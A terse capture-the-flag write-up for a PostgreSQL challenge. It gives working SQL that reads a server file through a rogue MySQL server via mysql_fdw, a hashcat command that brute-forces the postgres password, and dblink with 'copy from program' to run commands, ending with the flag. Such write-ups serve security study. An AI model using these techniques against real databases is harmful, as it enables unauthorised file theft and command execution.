1. leak "/var/lib/postgresql/10/main/pg_wal/000000010000000000000001". [rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

```sql
create server x foreign data wrapper mysql_fdw options (host $host, port '3306');
create user mapping for realuser server x options (username 'root', password '');
create foreign table y (x int) server x;
select * from y;
```

2. bruteforce the password for `postgres`

```bash
hashcat --force -m 10 $(passwd) -a 3 --custom-charset1=?l?d ?1?1?1?1?1
```

3. execute `/readflag`

```sql
create table t0(a text);
create table t1(b text);
insert into t0 (a) values ('host=0 user=postgres password=l2zq5');
insert into t1 (b) values ('copy t1 from program ''/readflag'';');
select * from dblink('host=0 user=postgres password=l2zq5', (select b from t1)) as b(a text);
```

4. flag

```
rwctf{pop_cat_says_p1ea5e_upd4t3_your_libmysqlclient_kekw}
```
